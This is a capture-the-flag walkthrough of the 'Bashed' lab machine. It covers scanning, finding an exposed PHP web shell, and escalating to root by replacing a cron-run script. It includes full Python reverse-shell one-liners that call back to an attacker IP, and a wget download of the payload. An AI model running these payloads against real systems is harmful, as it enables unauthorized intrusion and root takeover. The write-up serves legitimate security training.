# Bashed

**Machine ip:** 10.10.10.68

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.68 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.68`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1ff38f3a-a5aa-4493-a119-fa3ad2067bf8)

+ Navigate to `http://10.10.10.68`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a21b3006-628d-4a28-ad8b-4e7cfa141a30)

+ Directory fuzzing:
```
feroxbuster -u http://10.10.10.68 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w /usr/share/wordlists/dirb/common.txt --depth 2 --filter-status 200,403,404,500 -r --extract-links
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a24d471b-2314-4886-a94c-b7fb375d928e)

+ Check `http://10.10.10.68/dev/`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5fd4e705-edbc-413a-aea1-c21d4bb841fe)


## Gaining Access

+ Click one of the php files, and gain a semi-interactive web shell.
+ Cat user.txt

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7c07f5a-dc65-41f9-983c-1aa0f5697877)

+ Get revershell:
+ Run on your kali attack vm: `nc -lnvp 4444`
+ Run python reverse shell on the target's browser based semi interactive shell:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

+ `python -c 'import pty; pty.spawn("/bin/bash")'`
+ `sudo -ll`
+ **www-data** user can run commands as **scriptmanager** user: `sudo -u scriptmanager /bin/bash`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c5a05271-ac94-4d4e-9dd7-418a80eec712)

## Privilege Escalation
+ `cd /`
+ `ls -la`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/896f8a81-478c-41a0-a6e9-5729b1894204)

+ **scripts** directory is interesting: `cd scripts`
+ test.txt file is owned by **root** but it is writable by **scriptmanager**.
+ `ls -la`
+ `cat test.py`
+ `cat test.txt`
+ `ls -la`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/66e2654b-e29e-40be-b014-7f4c4dcb3ad4)

+ The last access time of the `test.txt` file changes every minute. The script runs every minute.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/df6a0cd2-5966-4fbb-91b8-5cad62124888)

+ Even `test.txt` file name is changed, exists `test.txt` the same file name each minute again.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/49b004f3-46e8-42d6-b672-4765d0cd1df4)

There is a cron job or something like a background process which runs **test.py** script automatically.
Replace **test.py** file with our test.py file containing reverse shell in order to get reverse shell of root user or not.

+ Create `test.py` revershell payload file on your attack machine:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

+ Start listener: `nc lnvp 5555`
+ Transfer it to target machine: `python3 -m http.server`
+ Download `wget 10.10.14.5:8000/test.py` and change the name.
+ Get the root shell:
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1b923d8-5e44-4c00-b9ab-c0405253686a)


# References & Alternatives:
+ https://vvmlist.github.io/#bashed
+ https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/bashed-writeup-w-o-metasploit
+ https://benheater.com/hackthebox-bashed/
+ https://danishzia.medium.com/hackthebox-htb-bashed-walkthrough-ab402b9f4715
+ https://lastlistener.github.io/Walkthroughs--HackTheBox_Bashed_Walkthrough_and_Lessons.html
